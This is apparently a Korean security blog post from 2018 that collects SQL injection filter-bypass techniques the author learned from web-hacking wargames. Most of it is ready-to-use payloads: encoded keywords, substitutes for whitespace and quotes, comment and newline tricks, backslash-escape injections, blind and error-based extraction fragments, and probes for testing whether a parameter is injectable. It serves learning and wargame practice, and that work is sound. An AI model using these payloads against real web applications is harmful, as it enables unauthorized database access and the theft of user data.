---
title: "SQL Injection 우회기법 정리"
description: "웹해킹 워게임을 풀면서 배운 SQL Injection 우회기법 모음"
date: 2018-05-10
tags: ["web-security", "sql-injection", "bypass", "waf"]
category: "Security Research"
published: true
---

지금까지 웹해킹 워게임을 풀면서 깨달은(?) 우회기법을 정리하려 합니다.


모두 수기로 기억나는대로 작성하다보니 빠진 부분도 있을 것 같습니다.


기억나는대로 추가해서 수정하겠습니다.


**- or, and**


: ||, &&


**- String Filtering (Ex. preg_match - admin 등)**


: admin -> 0x61646d696e, 0b0110000101100100011011010110100101101110, char(0x61, 0x64, 0x6d, 0x69, 0x6e)


* char()의 경우 타 진법으로도 사용 가능


**- Blind SQL Injection 시 '='(Equal) Filtering**


: substr('abc',1,1)like('a'), if(strcmp(substr('abc',1,1),'a'),0,1), substr('abc',1,1)%20in('a')


**- substr filtering**


: right(left('abc',1),1), id>0x41444d4941 ('ADMIN'은 'ADMIA'보다 hex값이 크다)


**- ereg, eregi**


: 'admin' 필터링 시 'AdmIN' 등으로 우회 가능


: 맨 앞에 %00을 삽입 시 뒤의 문자가 필터링 되지 않음


**- replace, replaceAll**


: 'admin' 필터링 시 'adadminmin' 등으로 우회 가능


**- numeric character filtering**


: 0 -> '!'='@'


: 1 -> '!'='!' 등으로 true, false 및 수식을 이용하여 숫자를 표현 가능


**- White Space Filtering (%20)**


: %20 -> %0a %0b %0c %0d %09


**- Single Quote Filtering (%27)**


: Single Quote 안에서 Double quote를 쓰면 해결되는 경우도 있음


: 특수한 조건에서 %bf%27 로 Multibyte를 만들어 필터링을 우회할 수도 있음 (하지만 거의 없는 경우)


: '\' 백슬래시 문자가 필터링 되어있지 않은 경우 다음과 같은 상황에서 우회 가능


ex. select test1 from test where id='\' and pw='or 1#


-> parameter : id=\&pw=%20or%201%23


**- 주석**


: #, --,**;%00**, /* */


**- 주석을 이용한 SQL Injection**


: '#'의 주석 범위는 1 line이다. 1 line을 나누는 기준은 %0a로 나뉘기 때문에 아래 예제와 같은 SQL Injection을 수행할 수 있다.


* select test1 from test where id='abc'# and pw='%0aor id='admin'%23


: /* */


* select test1 from test where id='abc'/* and pw=''*/or id='admin'%23


**- Blind SQL Injection 시 sub query의 결과로 여러 row가 나오는데 where 문을 쓸 수 없을 때**


: max(column_name), min(column_name), group_concat(column_name)


**- 테이블명, 컬럼명을 알아내야 할 때**


: select test1 from test where id='admin' and pw='1234' procedure analyse();


* limit 2,1 등과 함께 사용하여 필요한 컬럼 명을 한 줄로 뽑아낼 수 있음


**- Error Based SQL Injection 할 때**


: 0xfffffffffffff*0xfffffffffffff 를 하면 Integer 범위 초과 에러가 발생한다


**- MultiByte Character SQL Injection**


: 'test1' 필드의 캐릭터가 아스키코드가 아닌 멀티바이트 캐릭터(ex. UTF-32 등)일 때는 다음과 같은 방법으로 SQL Injection을 수행할 수 있다.


* substr(hex(test1),1,1)=0x41


※ MultiByte Character인지 알아보기 위한 방법으로는 '>'와 '<'를 이용하여 범위를 찾아나갈때 문자의 범위가 예를들어 20과 21사이로 나온다면(아스키 문자의 범위가 소숫점으로 나오는 경우는 없다) 멀티바이트 캐릭터라고 추측할 수 있다.


**- SQL Injection이 먹히는지 알아볼 때**


: '(싱글쿼터)를 썼을 때 에러가 나는지


: ' and '1'='1    ,     ' and '1'='2  를 썼을 때 앞에건 정상적으로 출력되고 뒤에건 출력이 안나는지


: ' or '1'='1 을 썼을 때 정상적으로 출력되는 지


: 숫자로 이루어진 컬럼 (ex. idx=23001) 을 idx=23002-1 로 넣었을 때 정상적으로 출력 되는 지


: '||' 를 썼을 때 정상적으로 출력되는 지 ( Restrict. DB가 Oracle이고 자료형이 Varchar로 선언되어 있을 때 )


: 주석을 쓸때는 #(%23), -- (--%20), %0a